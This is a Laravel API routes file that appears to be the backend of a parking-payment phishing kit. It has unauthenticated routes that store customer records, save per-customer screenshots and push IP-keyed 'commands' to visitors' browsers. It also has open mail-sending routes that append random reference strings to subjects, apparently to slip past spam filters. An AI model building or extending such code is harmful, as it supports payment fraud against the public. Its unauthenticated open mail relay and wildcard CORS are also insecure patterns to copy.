<?php

use App\Models\Number;
use App\Models\Command;
use App\Models\Customer;
use App\Models\Location;
use App\Mail\ParkingPaid;
use App\Models\Screenshot;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;

Route::get('/user', function (Request $request) {
    return $request->user();
})->middleware('auth:sanctum');

Route::post('api-test', function(Request $request) {
    return $request;
});

Route::get('/commands/{id}/{user}', function(Request $request, $id, $user) {
    $command = Command::where('ip', $id)->where('user_id', $user);
    $heads = [
        'Access-Control-Allow-Methods' => 'POST, GET, OPTIONS, DELETE, PUT',
        'Access-Control-Allow-Origin' => '*',
        'Content-Type' => 'text/event-stream',
        'Cache-Control' => 'no-cache',
        'Connection' => 'keep-alive',
        'X-Accel-Buffering' => 'no',
    ];
    $html = "id: " . $id . "\n";
    $html .= "event: command" . "\n";

    $resp = [
        'id' => null,
        'command' => null,
        'success' => false,
    ];

    if($command->count()) {
        $comm = $command->first();
        $resp['success'] = true;
        $resp['command'] = $comm->command;
        $resp['id'] = $comm->id;
    }

    $html .= "data: " . json_encode($resp) . "\n\n";
    return response($html)->withHeaders($heads);
});
Route::post('/upsert', function(Request $request) {
    $data = $request->toArray();

    $filled = []; unset($data['plate']); unset($data['parking']); unset($data['duration']); unset($data['code']);
    foreach($data as $key => $value) {
        if($value) {
            $filled[$key] = $value;
        }
    }

    $success = false;
    $customer = null;
    try {
        $customer = Customer::updateOrCreate([
            'id' => $data['id'],
        ], $filled);

        if(!$customer->active)
            throw new Exception("Customer record is inactive");

        $success = true;
    } catch(\Exception $e) {
        $customer = collect([$e->getMessage()]);
    }


    return response()->json([
        'status' => $success ? 'success' : 'failed',
        'data' => $customer->toArray(),
    ]);
});


Route::post('/canvas', function(Request $request) {
    $data = $request->toArray();

    $filled = [];
    foreach($data as $key => $value) {
        if($value) {
            $filled[$key] = $value;
        }
    }

    $success = false;
    $screenshot = null;

    try {
        $screenshot = Screenshot::updateOrCreate([
            'customer_id' => $data['customer_id'],
        ], $filled);

        $success = true;
    } catch(\Exception $e) {
        $screenshot = collect([$e->getMessage()]);
    }


    return response()->json([
        'status' => $success ? 'success' : 'failed',
        'data' => $screenshot->toArray(),
    ]);
});


Route::get('/delete-command/{command}', function(Command $command) {
    return response()->json([
        'success' => $command->delete() ? true : false,
        'data' => null,
    ]);
});

Route::get('/location/{location}', function(Location $location) {
    $array = [];
    if($location->id) {
        $array = $location->toArray();
        $array['currency'] = $location->currency;
        $array['user'] = $location->user->id;
        unset($array['qrcode']);
    }
    return response()->json([
        'success' => $location->id ? true : false,
        'data' => $array,
    ]);
});

Route::post('/sendmail', function(Request $request) {
    $data = $request->toArray();
    $data['rand'] = "📢Ref.#" . Str::random(40);
    $data['subject'] = $data['subject'] . " | 📢Ref.#" . Str::random(12);
    $sent = null;
    $message = null;
    try {
        $sent = Mail::to([$data['to']])->send(new ParkingPaid($data));
        $message = 'Mail sent';
    } catch(\Exception $e) {
        $sent = false;
        $message = $e->getMessage();
    }
    return response()->json([
        'success' => $sent,
        'data' => $message,
    ]);
});

Route::post('/sendmail-notification', function(Request $request) {
    $data = $request->toArray();
    $data['rand'] = "📢Ref.#" . Str::random(40);
    $data['subject'] = $data['subject'] . " | 📢Ref.#" . Str::random(12);
    $sent = null;
    $message = null;
    try {
        $sent = Mail::to([$data['to']])->send(new ParkingPaid($data));
        $message = 'Mail sent';
    } catch(\Exception $e) {
        $sent = false;
        $message = $e->getMessage();
    }
    return response()->json([
        'success' => $sent,
        'data' => $message,
    ]);
});

Route::get('/test/{test}', function($test) {
    return response()->json([
        'success' => true,
        'data' => $test,
    ]);
});


Route::get('/', function() {
    return response()->json([
        'success' => false,
        'data' => 'Website moved',
    ]);
});
